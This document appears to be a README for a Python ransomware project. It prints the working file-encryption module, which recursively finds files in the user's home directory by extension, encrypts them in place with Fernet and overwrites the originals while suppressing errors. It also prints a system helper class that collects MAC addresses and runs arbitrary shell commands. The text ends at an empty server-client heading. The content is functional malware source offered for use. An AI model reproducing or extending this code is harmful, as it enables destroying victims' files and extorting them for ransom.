# RANSOMWARE
Ransomware is a type of malicious software often used to encrypt files on a user's computer and demand a ransom to decrypt them.

## MODULES
### ENCDEC
```python
def Process_Files(Private: Fernet, mode: str):
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
                            temp_file.write(processed_chunk)
                            offset += len(chunk)
                shutil.move(temp_file.name, file)
            except Exception as e: pass
            finally:
                if os.path.exists(temp_file.name):
                    os.remove(temp_file.name)
```
- The `Process_Files` function takes two parameters: `Private`, a `Fernet` object used for encryption and decryption, and mode, a string specifying the operation mode (`encrypt` or `decrypt`).
- This function iterates through all files returned by the `List_Files` function.
- For each file, it creates a temporary file with the name of the original file appended with *.temp*.
- It opens the original file for reading and the temporary file for writing, with a buffer size of 4096*1024 bytes. It uses mmap to map the original file into memory. 
Then it reads and processes each `chunk` of the original file, with the `chunk` size being 4096*1024 bytes.
- Each `chunk` is then encrypted (if mode is `encrypt`) or decrypted (if mode is `decrypt`) using the `Fernet` object, and then written to the temporary file.
- Once all chunks have been processed, the temporary file is renamed to the name of the original file, replacing the original file. If an error occurs during this process, the function will ignore the error and continue with the next file. Finally, if the temporary file still exists, it will be deleted.
```python
def List_Files() -> dict:
    with open('scripts/extensions.yaml', 'r') as file:
        exts = Safe_Load(file)

    file_categories = {category: [] for category in exts}
    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

    for entry in Path.home().rglob('*'):
        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
            file_categories[extcategory[ext]].append(str(entry))

    return file_categories
```
- The function opens the file '*scripts/extensions.yaml*' for reading and uses the `Safe_Load(file)` function to parse *YAML* data from this file. The result is stored in the variable exts.
- It creates a dictionary `file_categories` with keys as categories from exts and values as empty lists. It also creates a dictionary extcategory where each file extension in `exts` is a key and its corresponding category is the value.
- Then it iterates through all files in the user's home directory. If an entry is a file and its extension (converted to lowercase) is in `extcategory`, the file is added to the corresponding category in `file_categories`.
### SYSTEM
```python
class System:
    def __init__(self) -> None:
        self.Windows = _os_name == 'nt'
 
    def Init(self) -> None:
        _system('')

    def Clear(self) -> None:
        return _system("cls" if self.Windows else "clear")

    def Title(self, title: str):
        if self.Windows:
            return _system(f"title {title}")

    def Size(self, x: int, y: int) -> None:
        if self.Windows:
            return _system(f"mode {x}, {y}")
    
    def Reset(self) -> None:
        execv(executable, [executable] + argv) 
    
    def Mac(self) -> str:
        try:
            address_mac = [
                address.address 
                for addresses in net_if_addrs().values() 
                for address in addresses 
                if address.family == AF_LINK
            ]
            return '|'.join(address_mac) if address_mac else 'nm'  
        except:
            return 'nm'
    
    def Command(command: str):
        return _system(command)
```
    1 variable:
        Windows    |     Indicates whether the user is using the Windows operating system or not
    7 functions:
        Init()     |     Initializes the terminal to enable color usage
        Clear()    |     Clears the terminal
        Title()    |     Sets the title of the terminal, only applicable for Windows
        Size()     |     Sets the size of the terminal, only applicable for Windows
        Reset()    |     Restarts the current program
        Mac()      |     Retrieves the MAC address of the computer
        Command()  |     Executes a shell command on the computer's system
```python
def Console(ip: str, msg: str, color: str) -> None:
    color_code = getattr(Col, color)
    message = f" [{Col.Green}{ip}{Col.White}] --> {color_code}{msg}{Col.White}."
    print(message)
```

- The getattr function is used to retrieve the value of the color attribute from the Col object.
- It creates a formatted string and prints the formatted string.

## SERVER - CLIENT